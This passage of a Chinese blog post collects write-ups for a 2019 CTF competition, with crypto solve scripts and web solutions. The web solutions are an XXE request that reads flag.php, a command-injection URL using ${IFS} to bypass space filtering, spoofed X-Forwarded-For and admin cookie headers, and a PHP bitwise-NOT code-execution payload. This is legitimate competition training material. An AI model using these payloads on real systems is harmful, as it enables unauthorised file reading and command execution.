class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p = 30804877236372761296348297513767908130120426767441642194038947059431749919743933282721728129660558520306627781991434638545287122418576024822599938752655436891429241798416041881441469038271460545196755187872022209260074336340748692939443634393492611052850561312058115000234467417922716845989845380178291512893577636848676778152648705150749219629638913963012345388388992649857974643758097581431795569765569985118215469798809551704275008726932734117893757436777110974529289423114881289423038562352073193732977840168067817149865622380253870276206212656648830136975036452877460473463818007722056777837507566352911184181643</span><br><span class="line">q = 26038591288856688238001759665609016744197175469090080494077820415283745172609947555684568450035539489682168553390403854805974969118763740560638548072896648612347287461822059996717273680094814363090434263883250281614203478279438635312321752371517752177819983938115532573238089291708699056464231184039223531822571471611431921747169774540943776543504663419138030516108434288911593973010680364553026970545232818747951718950151516127319881685156986937644295056292836729469548074713781625918117631575942194589642230959265894967721587381648790905383499092379075578245308113268969812469233669312409066969648987454629639842309</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">#print N</span><br><span class="line">#print e</span><br><span class="line">phin = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"># with open(&apos;private.pem&apos;, &apos;r&apos;) as f:</span><br><span class="line">#     private = RSA.importKey(f)</span><br><span class="line">#     oaep = PKCS1_OAEP.new(private)</span><br><span class="line"></span><br><span class="line">with open(&apos;flag.txt.en&apos;, &apos;rb&apos;) as f:</span><br><span class="line">    data_enc = int(f.read().encode(&apos;hex&apos;),16)</span><br><span class="line">plain = gmpy2.powmod(data_enc, d, N)</span><br><span class="line">plain = hex(plain)[2:]</span><br><span class="line">if len(plain) % 2 != 0:</span><br><span class="line">    plain = &apos;0&apos; + plain</span><br><span class="line">print plain.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-102d06539450eaf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="美好的回忆"><a href="#美好的回忆" class="headerlink" title="美好的回忆"></a>美好的回忆</h2><p>利用第二段 爆破key，然后解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">raw =&quot;ood time&quot;</span><br><span class="line"></span><br><span class="line">two = [0xCD, 0xD9, 0x3B, 0x0A, 0xCF, 0xAA, 0x2A, 0x1E]</span><br><span class="line"></span><br><span class="line">iv = [0x55, 0xE5, 0x9E, 0x0E, 0x27, 0x8A, 0x34, 0x63]</span><br><span class="line"></span><br><span class="line">#通过iv 和 密文 和 原文 可以算出 key</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">for i in raw:</span><br><span class="line">    key.append(ord(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t_key =[]</span><br><span class="line"></span><br><span class="line">for i in xrange(8):</span><br><span class="line">    for j in xrange(256):</span><br><span class="line">        if two[i]^j^iv[i] == key[i]:</span><br><span class="line">            # t_key.append(chr(key[i]))</span><br><span class="line">            t_key.append(j)</span><br><span class="line"></span><br><span class="line">print t_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = file(&apos;flag.txt.encrypted&apos;,&apos;r&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw_iv = f.read(8)</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in xrange(7):</span><br><span class="line">    enc = f.read(8)</span><br><span class="line">    for i in xrange(8):</span><br><span class="line">        flag+=chr(ord(raw_iv[i])^t_key[i]^ord(enc[i]))</span><br><span class="line">    raw_iv = enc</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h2 id="悲伤的结局"><a href="#悲伤的结局" class="headerlink" title="悲伤的结局"></a>悲伤的结局</h2><ul>
<li>爆破 最后的padding 其他和上一题一样</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># print 19 ^ 24 ^ 1</span><br><span class="line"># exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw =&quot;keep away from xiaocui!&quot;</span><br><span class="line"></span><br><span class="line"># raw = &quot;have a good time.flag&#123;21cb8c804abb60be5c9befcc928ccf5b&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE =8</span><br><span class="line"></span><br><span class="line">def pad(data):</span><br><span class="line">    padding_len = BLOCK_SIZE - len(data) % BLOCK_SIZE</span><br><span class="line">    return data + (chr(padding_len) * padding_len).encode()</span><br><span class="line"></span><br><span class="line">#存在8种可能性</span><br><span class="line"></span><br><span class="line">for i in xrange(8):</span><br><span class="line">    print &apos;--------------------&apos;</span><br><span class="line">    n=i+1</span><br><span class="line">    raw_last = raw[-n-8:-n]</span><br><span class="line">    print raw_last</span><br><span class="line">    print pad(raw_last)</span><br><span class="line">    raw_last = pad(raw_last)</span><br><span class="line"></span><br><span class="line">    iv = [0x15,0xEC,0x98,0x1C,0x6E,0xCD,0x6A,0x35]</span><br><span class="line">    two = [0xDB, 0xDD, 0x3C, 0x5E, 0x91, 0xE7, 0x20, 0x1F]</span><br><span class="line">    # two = [0x14, 0xED, 0x9E, 0x1C, 0x38, 0xCC, 0x2E, 0x0D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    two = [0xF7,0x84,0x4B,0xE5,0x61,0x93,0x7B,0x98]</span><br><span class="line">    iv =[0x0A,0x23,0x86,0xED,0xB9,0xFF,0x9D,0x81]</span><br><span class="line"></span><br><span class="line">    # two = [0xED, 0x80, 0x4A, 0x97, 0x0C, 0xF6, 0x10, 0xFF]</span><br><span class="line"></span><br><span class="line">    # two = [0x45, 0x2F, 0xD1, 0xF4, 0xA9, 0xBE, 0x94, 0x90]</span><br><span class="line"></span><br><span class="line">    #[247, 83, 193, 36, 156, 73, 115, 24]</span><br><span class="line">    # two = [0xEB,0xB6,0x57,0x30,0xAC,0x8D,0x55,0x1D]</span><br><span class="line">    # iv = [0x14,0xED,0x9E,0x1C,0x38,0xCC,0x2E,0x0D]</span><br><span class="line"></span><br><span class="line">    # 通过iv 和 密文 和 原文 可以算出 key</span><br><span class="line"></span><br><span class="line">    [0xE5, 0x20, 0xD1, 0x51, 0x08, 0xDB, 0x11, 0xF3]</span><br><span class="line">    [0x56, 0x04, 0xEB, 0xA1, 0xDA, 0xB7, 0xFD, 0xF7]</span><br><span class="line">    [0xFD, 0xA7, 0x71, 0xBC, 0x13, 0x9E, 0x13, 0xBC]</span><br><span class="line">    [0x4C, 0x08, 0xAE, 0xA6, 0x92, 0xBC, 0xFC, 0xA3]</span><br><span class="line">    [0xB1, 0xBA, 0x66, 0xBA, 0x5F, 0x89, 0x5C, 0xA1]</span><br><span class="line">    [0x02, 0x5C, 0xA8, 0xBB, 0x9B, 0xAC, 0xAE, 0xEA]</span><br><span class="line">    [0xB7, 0xFF, 0x73, 0xA0, 0x4E, 0x93, 0x02, 0xA1]</span><br><span class="line">    [0x08, 0x4C, 0xBD, 0xE9, 0x86, 0xB1, 0xA2, 0xBE]</span><br><span class="line">    [0xBD, 0xEF, 0x6E, 0xF2, 0x07, 0x98, 0x5B, 0xB0]</span><br><span class="line">    [0x13, 0x07, 0xDE, 0xCC, 0xCE, 0xBD, 0xB8, 0xB3]</span><br><span class="line">    [0xE2, 0xE1, 0x05, 0xD6, 0x4F, 0x85, 0x50, 0xBD]</span><br><span class="line">    [0x46, 0x07, 0xD4, 0xD6, 0x9D, 0xBA, 0xFC, 0xF6]</span><br><span class="line">    [0xF8, 0xAE, 0x00, 0xCC, 0x49, 0x9B, 0x19, 0xB3]</span><br><span class="line">    [0x2F, 0x0E, 0xD6, 0xC4, 0x8F, 0xAC, 0xA9, 0xBD]</span><br><span class="line">    [0xCA, 0xFA, 0x0A, 0x9C, 0x4B, 0xD5, 0x4B, 0xE1]</span><br><span class="line">    [0x22, 0x0A, 0x88, 0xCD, 0x88, 0xAD, 0xAE, 0xBC]</span><br><span class="line">    [0x9B, 0xFF, 0x0B, 0xC7, 0x19, 0xD9, 0x48, 0xE6]</span><br><span class="line">    [0x70, 0x0C, 0x80, 0xCD, 0x81, 0xA6, 0xB5, 0x87]</span><br><span class="line">    [0xFE, 0xA5, 0x1A, 0xFD, 0x4F, 0x9F, 0x5B, 0x8B]</span><br><span class="line">    [0x0F, 0x30, 0xCF, 0xB4, 0xBD, 0xBA, 0xB6, 0x90]</span><br><span class="line">    [0xBE, 0x93, 0x59, 0x8E, 0x73, 0xD6, 0x78, 0x9A]</span><br><span class="line">    [0x0A, 0x23, 0x86, 0xED, 0xB9, 0xFF, 0x9D, 0x81]</span><br><span class="line">    iv = [0xF7, 0x84, 0x4B, 0xE5, 0x61, 0x93, 0x7B, 0x98]</span><br><span class="line">    two =[0x45, 0x2F, 0xD1, 0xF4, 0xA9, 0xBE, 0x94, 0x90]</span><br><span class="line">    [0xED, 0x80, 0x4A, 0x97, 0x0C, 0xF6, 0x10, 0xFF]</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    for i in raw_last:</span><br><span class="line">        key.append(ord(i))</span><br><span class="line"></span><br><span class="line">    t_key = []</span><br><span class="line"></span><br><span class="line">    for i in xrange(8):</span><br><span class="line">        for j in xrange(256):</span><br><span class="line">            if two[i] ^ j ^ iv[i] == key[i]:</span><br><span class="line">                # t_key.append(chr(key[i]))</span><br><span class="line">                t_key.append(j)</span><br><span class="line"></span><br><span class="line">    print t_key</span><br><span class="line"></span><br><span class="line">    f = file(&apos;flag.txt.encrypted&apos;, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">    raw_iv = f.read(8)</span><br><span class="line"></span><br><span class="line">    flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">    for i in xrange(24):</span><br><span class="line">        enc = f.read(8)</span><br><span class="line">        for i in xrange(8):</span><br><span class="line">            flag += chr(ord(raw_iv[i]) ^ t_key[i] ^ ord(enc[i]))</span><br><span class="line">        raw_iv = enc</span><br><span class="line"></span><br><span class="line">    print flag</span><br><span class="line"></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="XX"><a href="#XX" class="headerlink" title="XX"></a>XX</h2><ul>
<li>源码泄漏 index.php~，Xxe 利用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Accept: text/html, application/xhtml+xml, image/jxr, */*</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Host: 119.61.19.212:8083</span><br><span class="line">Proxy-Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Length: 225</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;111&lt;/pass&gt;`&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><ul>
<li>利用ifs绕过空格，利用/flag绕过flag</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.61.19.212:8081/index.php?A=a;grep$&#123;IFS&#125;fla$&#123;IFS&#125;/fla*</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-078bb08097cfb41b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="小明拒绝"><a href="#小明拒绝" class="headerlink" title="小明拒绝"></a>小明拒绝</h2><ul>
<li>头部加上</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: admin=1</span><br></pre></td></tr></table></figure>

<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li>利用取反</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: y0unge</span><br><span class="line"> * Date: 2019-09-09</span><br><span class="line"> * Time: 17:30</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">//echo (~urldecode(&quot;%8F&quot;));</span><br><span class="line">echo urlencode(~&quot;GetYourFlag&quot;);</span><br></pre></td></tr></table></figure>

<p>生成取反的exp</p>
<p>即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://119.61.19.212:8082/index.php?code=(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-6b31e09b68b2a374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h2><ul>
<li>存在注入，可以读出信息</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-f146f0e56878980b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-1474d45a62503919.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>密码明文</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-d89ec0d25cac4a3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>模板注入,需要上传模板，由于没找到key，采用爆破的方式访问注入的页面</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-f416446cd62a333a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><ul>
<li>扫描目录发现</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-2ad7a71df704a39e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>直接有flag</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-4af6a1f8aac8288b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>常规思路应该是Api目录爆破file参数，读到hack.php文件代码，hack.php写文件</li>
</ul>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    D4rk3r
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://yoursite.com/2019/09/10/2019广东强网杯-wp/" title="2019广东强网杯_wp">http://yoursite.com/2019/09/10/2019广东强网杯-wp/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" <i class="fa fa-tag"> ctf</a>
          
            <a href="/tags/Pwn/" <i class="fa fa-tag"> Pwn</a>
          
            <a href="/tags/Writeups/" <i class="fa fa-tag"> Writeups</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/08/2019护网杯-pwn/" rel="next" title="2019护网杯_pwn">
                <i class="fa fa-chevron-left"></i> 2019护网杯_pwn
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/09/24/2019数字经济云安全共测大赛初赛-pwn/" rel="prev" title="2019数字经济云安全共测大赛初赛_pwn">
                2019数字经济云安全共测大赛初赛_pwn <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="D4rk3r">
            
              <p class="site-author-name" itemprop="name">D4rk3r</p>
              <p class="site-description motion-element" itemprop="description">Impossible -> I'm possible</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">38</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/hacker-mao" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:hacker_mao@foxmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" title="简书">
                      
                        <i class="fa fa-fw fa-globe"></i>简书</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.1.</span> <span class="nav-text">pwn1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#完美的错误"><span class="nav-number">2.1.</span> <span class="nav-text">完美的错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#撸啊撸"><span class="nav-number">2.2.</span> <span class="nav-text">撸啊撸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脑筋急转弯"><span class="nav-number">2.3.</span> <span class="nav-text">脑筋急转弯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓灰阔"><span class="nav-number">2.4.</span> <span class="nav-text">抓灰阔</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#强大的hash"><span class="nav-number">3.1.</span> <span class="nav-text">强大的hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#遗失的秘密"><span class="nav-number">3.2.</span> <span class="nav-text">遗失的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#美好的回忆"><span class="nav-number">3.3.</span> <span class="nav-text">美好的回忆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#悲伤的结局"><span class="nav-number">3.4.</span> <span class="nav-text">悲伤的结局</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">4.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XX"><span class="nav-number">4.1.</span> <span class="nav-text">XX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ping"><span class="nav-number">4.2.</span> <span class="nav-text">ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小明拒绝"><span class="nav-number">4.3.</span> <span class="nav-text">小明拒绝</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">4.4.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找漏洞"><span class="nav-number">4.5.</span> <span class="nav-text">找漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API"><span class="nav-number">4.6.</span> <span class="nav-text">API</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">D4rk3r</span>

  
</div>


<span id="busuanzi_container_site_pv">本站访客数:<span id="busuanzi_value_site_uv"></span></span>




<div class="powered-by">

<!--
  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>

-->





<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共71.6k字</span>
</div>

<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
<a href="http://www.beian.miit.gov.cn/" style="color:#f72b07" target="_blank">粤ICP备16096118号-1</a>


        







        
      </div>
    </div></footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz',
        appKey: '5zQS6AJMU15VfzcEXr0cw0cr',
        placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz", "5zQS6AJMU15VfzcEXr0cw0cr");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

